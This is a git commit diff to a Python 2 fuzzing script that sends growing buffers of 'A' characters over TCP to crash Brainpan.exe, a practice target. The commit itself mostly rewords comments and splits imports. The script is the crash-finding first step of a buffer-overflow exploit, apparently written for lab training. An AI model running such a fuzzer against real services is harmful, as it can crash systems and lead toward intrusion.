5375d95b6a4a7c639ea82032f9a56cdc874213e8
Chris <atnl@protonmail.com>
2020-07-31 02:32:31 +0000

    Update bfuzz.py

--- bfuzz.py
+++ bfuzz.py
@@ -1,24 +1,25 @@
 #!/usr/bin/python
-import time, struct, sys
+import time
+import struct
+import sys
 import socket as so
 
-# Buff represents an array of buffers.This will begin at 100, and increment by 100, until it reaches 4000, or until Brainpan.exe crashes.
+#Buff represents an array of buffers.
+#This will begin at 100, and increment by 100..
+#Will continue untill it reaches 4000, or until Brainpan.exe crashes.
 
 buff=["A"]
 
-# Maximum size of buffer.
-
+#Maximum size of buffer.
 max_buffer = 4000
 
-# Initial counter value.
-
+#Initial counter value.
 counter = 100
 
-# Value to increment per attempt.
-
+#Value to increment per attempt.
 increment = 100
 
-
+#While the buffer length is less than or equal to 4000..
 while len(buff) <= max_buffer:
     buff.append("A"*counter)
     counter=counter+increment
@@ -31,8 +32,8 @@ for string in buff:
         print "[+] Usage example: python %s 192.168.1.10 9999" % sys.argv[0]
         sys.exit()   
      print "[+] Attempting to crash brainpan.exe at %s bytes" % len(string)
-     s = so.socket(so.AF_INET, so.SOCK_STREAM)
-     try:
+     s = so.socket(so.AF_INET, so.SOCK_STREAM)  #Create a socket object, using IPv4 TCP 
+     try: #Connect to the server and port & send data.
         s.connect((server,port))
         s.send(string + '\r\n')
         s.close()
